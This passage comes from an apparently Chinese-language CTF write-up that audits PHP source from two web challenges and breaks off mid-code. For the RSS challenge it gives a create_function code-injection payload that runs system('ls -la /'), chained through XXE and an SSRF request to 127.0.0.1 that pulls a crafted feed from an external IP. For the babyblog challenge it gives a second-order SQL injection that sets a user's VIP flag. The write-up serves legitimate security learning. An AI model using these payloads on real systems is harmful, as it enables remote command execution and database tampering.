class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="hljs-string">'display_errors'</span>,<span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">'display_startup_erros'</span>,<span class="hljs-number">1</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">'routes.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span><span class="hljs-params">($class_name)</span></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">'./classes/'</span>.$class_name.<span class="hljs-string">'.php'</span>)) {</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">require_once</span> <span class="hljs-string">'./classes/'</span>.$class_name.<span class="hljs-string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">'./controllers/'</span>.$class_name.<span class="hljs-string">'.php'</span>)) {</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">require_once</span> <span class="hljs-string">'./controllers/'</span>.$class_name.<span class="hljs-string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>routes.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">Route::set(<span class="hljs-string">'index.php'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    Index::createView(<span class="hljs-string">'Index'</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">Route::set(<span class="hljs-string">'index'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    Index::createView(<span class="hljs-string">'Index'</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">Route::set(<span class="hljs-string">'fetch'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'rss_url'</span>])){</span><br><span class="line">        Fetch::handleUrl($_REQUEST[<span class="hljs-string">'rss_url'</span>]);</span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">Route::set(<span class="hljs-string">'rss_in_order'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'rss_url'</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'order'</span>])){</span><br><span class="line">        Admin::createView(<span class="hljs-string">'Admin'</span>);</span><br><span class="line">    }<span class="hljs-keyword">else</span>{</span><br><span class="line">      <span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] == <span class="hljs-string">'127.0.0.1'</span> || $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] == <span class="hljs-string">'::1'</span>){</span><br><span class="line">        Admin::sort($_REQUEST[<span class="hljs-string">'rss_url'</span>],$_REQUEST[<span class="hljs-string">'order'</span>]);</span><br><span class="line">      }<span class="hljs-keyword">else</span>{</span><br><span class="line">       <span class="hljs-keyword">echo</span> <span class="hljs-string">";("</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>controllers/Admin.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sort</span><span class="hljs-params">($url,$order)</span></span>{</span><br><span class="line">        $rss=file_get_contents($url);</span><br><span class="line">        $rss=simplexml_load_string($rss,<span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="hljs-keyword">require_once</span> <span class="hljs-string">'./views/Admin.php'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>controllers/Fetch.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fetch</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleUrl</span><span class="hljs-params">($url)</span> </span>{</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        $invalidUrl = <span class="hljs-keyword">false</span>;</span><br><span class="line">true<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/aliyun\.com$/'</span>, $r[<span class="hljs-string">'host'</span>]) || preg_match(<span class="hljs-string">'/baidu\.com$/'</span>, $r[<span class="hljs-string">'host'</span>]) || preg_match(<span class="hljs-string">'/qq\.com$/'</span>, $r[<span class="hljs-string">'host'</span>])) { </span><br><span class="line">            $rss = Rss::fetch($url);</span><br><span class="line">        }<span class="hljs-keyword">else</span> {</span><br><span class="line">            $invalidUrl = <span class="hljs-keyword">true</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">require_once</span> <span class="hljs-string">'./views/Fetch.php'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Rss.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Rss</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl_request</span><span class="hljs-params">($url, $post = <span class="hljs-string">''</span>, $cookie = <span class="hljs-string">''</span>, $headers = <span class="hljs-string">''</span>, $returnHeader = <span class="hljs-number">0</span>)</span> </span>{</span><br><span class="line">        $curl = curl_init();</span><br><span class="line">        curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($curl, CURLOPT_USERAGENT, <span class="hljs-string">'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_AUTOREFERER, <span class="hljs-number">1</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_REFERER, $url);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, <span class="hljs-keyword">false</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> ($post) {</span><br><span class="line">            curl_setopt($curl, CURLOPT_POST, <span class="hljs-number">1</span>);</span><br><span class="line">            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> ($cookie) {</span><br><span class="line">            curl_setopt($curl, CURLOPT_COOKIE, $cookie);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> ($headers) {</span><br><span class="line">            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);</span><br><span class="line">        }</span><br><span class="line">        curl_setopt($curl, CURLOPT_HEADER, <span class="hljs-number">1</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_TIMEOUT, <span class="hljs-number">5</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);</span><br><span class="line">        $data = curl_exec($curl);</span><br><span class="line">        <span class="hljs-keyword">if</span> (curl_errno($curl)) {</span><br><span class="line">            <span class="hljs-keyword">return</span> curl_error($curl);</span><br><span class="line">        }</span><br><span class="line">        curl_close($curl);</span><br><span class="line">        <span class="hljs-keyword">list</span>($header, $body) = explode(<span class="hljs-string">"\r\n\r\n"</span>, $data, <span class="hljs-number">2</span>);</span><br><span class="line">        $info[<span class="hljs-string">'header'</span>] = $header;</span><br><span class="line">        $info[<span class="hljs-string">'body'</span>] = $body;</span><br><span class="line">        <span class="hljs-keyword">return</span> $info;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetch</span><span class="hljs-params">($url)</span> </span>{</span><br><span class="line">        libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);</span><br><span class="line">        $rss=file_get_contents($url);</span><br><span class="line">        $rss=simplexml_load_string($rss,<span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="hljs-keyword">return</span> $rss;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>view/Admin.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] != <span class="hljs-string">'127.0.0.1'</span>){</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">';('</span>);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">'package/header.php'</span>) <span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(!$rss) {</span><br><span class="line">    <span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;div class="rss-head row"&gt;</span><br><span class="line">    &lt;h1&gt;RSS解析失败&lt;/h1&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;此网站RSS资源可能存在错误无法解析&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;此网站RSS资源可能已经关闭&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;此网站可能禁止PHP获取此内容&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;可能由于来自本站的访问过多导致暂时访问限制Orz&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">};</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rss_sort_date</span><span class="hljs-params">($str)</span></span>{</span><br><span class="line">    $time=strtotime($str);</span><br><span class="line">    <span class="hljs-keyword">return</span> date(<span class="hljs-string">"Y年m月d日 H时i分"</span>,$time);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div class="rss-head row"&gt;</span><br><span class="line">    &lt;div class="col-sm-12 text-center"&gt;</span><br><span class="line">        &lt;h1&gt;&lt;a href=<span class="hljs-string">"&lt;?php echo $rss-&gt;channel-&gt;link;?&gt;"</span> target=<span class="hljs-string">"_blank"</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $rss-&gt;channel-&gt;title;<span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;span style=<span class="hljs-string">"font-size: 16px;font-style: italic;width:100%;"</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $rss-&gt;channel-&gt;link;<span class="hljs-meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">        &lt;p&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $rss-&gt;channel-&gt;description;<span class="hljs-meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">        <span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($rss-&gt;channel-&gt;lastBuildDate)&amp;&amp;$rss-&gt;channel-&gt;lastBuildDate!=<span class="hljs-string">""</span>){</span><br><span class="line">                <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; 最后更新:"</span>.rss_sort_date($rss-&gt;channel-&gt;lastBuildDate).<span class="hljs-string">"&lt;/p&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">        <span class="hljs-meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="article-list" style="padding:10px"&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> </span><br><span class="line">    $data = [];</span><br><span class="line">    <span class="hljs-keyword">foreach</span>($rss-&gt;channel-&gt;item <span class="hljs-keyword">as</span> $item){</span><br><span class="line">        $data[] = $item;</span><br><span class="line">    }</span><br><span class="line">    usort($data, create_function(<span class="hljs-string">'$a, $b'</span>, <span class="hljs-string">'return strcmp($a-&gt;'</span>.$order.<span class="hljs-string">',$b-&gt;'</span>.$order.<span class="hljs-string">');'</span>));</span><br><span class="line">    <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $item){    </span><br><span class="line">    <span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;article class="article"&gt;</span><br><span class="line">            &lt;h1&gt;&lt;a href=<span class="hljs-string">"&lt;?php echo $item-&gt;link;?&gt;"</span> target=<span class="hljs-string">"_blank"</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $item-&gt;title;<span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">            &lt;div class="content"&gt;</span><br><span class="line">                &lt;p&gt;</span><br><span class="line">                    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $item-&gt;description;<span class="hljs-meta">?&gt;</span></span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class="article-info"&gt;</span><br><span class="line">                &lt;i style=<span class="hljs-string">"margin:0px 5px"</span>&gt;&lt;/i&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> rss_sort_date($item-&gt;pubDate);<span class="hljs-meta">?&gt;</span></span><br><span class="line">                &lt;i style=<span class="hljs-string">"margin:0px 5px"</span>&gt;&lt;/i&gt;</span><br><span class="line">                <span class="hljs-meta">&lt;?php</span></span><br><span class="line">                    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;count($item-&gt;category);$i++){</span><br><span class="line">                        <span class="hljs-keyword">echo</span> $item-&gt;category[$i];</span><br><span class="line">                        <span class="hljs-keyword">if</span>($i+<span class="hljs-number">1</span>!=count($item-&gt;category)){</span><br><span class="line">                            <span class="hljs-keyword">echo</span> <span class="hljs-string">","</span>;</span><br><span class="line">                        }</span><br><span class="line">                    };</span><br><span class="line">                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($item-&gt;author)&amp;&amp;$item-&gt;author!=<span class="hljs-string">""</span>){</span><br><span class="line">                <span class="hljs-meta">?&gt;</span></span><br><span class="line">                        &lt;i class="fa fa-user" style="margin:0px 5px"&gt;&lt;/i&gt;</span><br><span class="line">                <span class="hljs-meta">&lt;?php</span></span><br><span class="line">                        <span class="hljs-keyword">echo</span> $item-&gt;author;</span><br><span class="line">                    }</span><br><span class="line">                <span class="hljs-meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/article&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> }<span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="text-center"&gt;</span><br><span class="line">    免责声明:本站只提供RSS解析,解析内容与本站无关,版权归来源网站所有</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">'package/footer.php'</span>) <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以在 view/Admin.php 中看到关键点</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort($data, create_function(<span class="hljs-string">'$a, $b'</span>, <span class="hljs-string">'return strcmp($a-&gt;'</span>.$order.<span class="hljs-string">',$b-&gt;'</span>.$order.<span class="hljs-string">');'</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>这是个在 FireShell CTF 2019 出过的考点，因为<code>create_function</code>可以进行代码注入，我们可以有以下这种操作</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,id);};<span class="hljs-keyword">die</span>(system(<span class="hljs-string">'ls -la /'</span>));<span class="hljs-comment">/*</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这样就可以进行命令执行了，所以我们只需要在 xxe 中构造一个 ssrf 绕过 127.0.0.1 的判断就行了</p><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="hljs-keyword">filter</span>/convert.base<span class="hljs-number">64</span>-encode/resource=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/rss_in_order?rss_url=http<span class="hljs-symbol">%3</span>A<span class="hljs-symbol">%2</span>F<span class="hljs-symbol">%2</span>F<span class="hljs-number">122.112</span>.<span class="hljs-number">199.14</span><span class="hljs-symbol">%2</span>Fexample&amp;order=id<span class="hljs-symbol">%2</span>Cid)<span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%7</span>D<span class="hljs-symbol">%3</span>Bdie(system('ls<span class="hljs-symbol">%20</span>-la<span class="hljs-symbol">%20</span><span class="hljs-symbol">%2</span>F'))<span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%2</span>F*</span><br></pre></td></tr></tbody></table></figure><p></p><p>在<code>/flag_eb8ba2eb07702e69963a7d6ab8669134</code>拿到 flag</p><h2 id="babyblog"><a href="#babyblog" class="headerlink" title="babyblog"></a>babyblog</h2><p>这个题最后没啥时间做了，比较可惜。赛后复盘了一下，仔细看看也没太大的难度，属于还算比较简单的。</p><p>扫描可以拿到 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> ，拿到源码，进行审计。</p><p>在 replace.php 中有经过<code>$row['isvip'] == 1</code>判断才能使用的功能，在 register.php 中有</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql-&gt;query(<span class="hljs-string">"insert into users (username,password,isvip) values ('$username', '$password',0);"</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>每次注册<code>isvip</code>被设置为 0 的，所以接下来我们需要找个注入点把我们设置为 vip</p><p>关键点就在 edit.php 当中：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'title'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'content'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'id'</span>])){</span><br><span class="line">true<span class="hljs-keyword">foreach</span>($sql-&gt;query(<span class="hljs-string">"select * from article where id="</span> . intval($_POST[<span class="hljs-string">'id'</span>]) . <span class="hljs-string">";"</span>) <span class="hljs-keyword">as</span> $v){</span><br><span class="line">truetrue$row = $v;</span><br><span class="line">true}</span><br><span class="line">true<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">'id'</span>] == $row[<span class="hljs-string">'userid'</span>]){</span><br><span class="line">truetrue$title = addslashes($_POST[<span class="hljs-string">'title'</span>]);</span><br><span class="line">truetrue$content = addslashes($_POST[<span class="hljs-string">'content'</span>]);</span><br><span class="line">truetrue$sql-&gt;query(<span class="hljs-string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="hljs-string">'title'</span>] . <span class="hljs-string">"';"</span>);</span><br><span class="line">truetrue<span class="hljs-keyword">exit</span>(<span class="hljs-string">"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">true}<span class="hljs-keyword">else</span>{</span><br><span class="line">truetrue<span class="hljs-keyword">exit</span>(<span class="hljs-string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">true}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>其中</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql-&gt;query(<span class="hljs-string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="hljs-string">'title'</span>] . <span class="hljs-string">"';"</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>$row['title']</code>是上面 sql 语句取出来的结果，而<code>title</code>在 writing.php 插入的时候，虽然做了防注入，使用<code>addslashes</code>转义了<code>title</code>的内容</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'title'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'content'</span>])){</span><br><span class="line">true$title = addslashes($_POST[<span class="hljs-string">'title'</span>]);</span><br><span class="line">true$content = addslashes($_POST[<span class="hljs-string">'content'</span>]);</span><br><span class="line">true$sql-&gt;query(<span class="hljs-string">"insert into article (userid,title,content) values ("</span> . $_SESSION[<span class="hljs-string">'id'</span>] . <span class="hljs-string">", '$title','$content');"</span>);</span><br><span class="line">true<span class="hljs-keyword">exit</span>(<span class="hljs-string">"&lt;script&gt;alert('Posted successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>但是在上面未经任何处理又直接取出来会导致二次注入，例如第一次插入<code>'1</code>，经过<code>addlashes</code>转义，sql 语句变成</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> article (userid,title,<span class="hljs-keyword">content</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">"1"</span>, <span class="hljs-string">'\'</span><span class="hljs-number">1</span><span class="hljs-string">','</span><span class="hljs-number">1</span><span class="hljs-string">');"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是插入数据库的内容是<code>'1</code>，取出来的时候也是<code>'1</code>，这就导致了注入。</p><p>所以我们可以利用这个点进行注入，update 我们的 isvip 字段就行</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';<span class="hljs-keyword">update</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">set</span> isvip=<span class="hljs-number">1</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'zedd'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>接下来就是那个奇葩正则了：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span 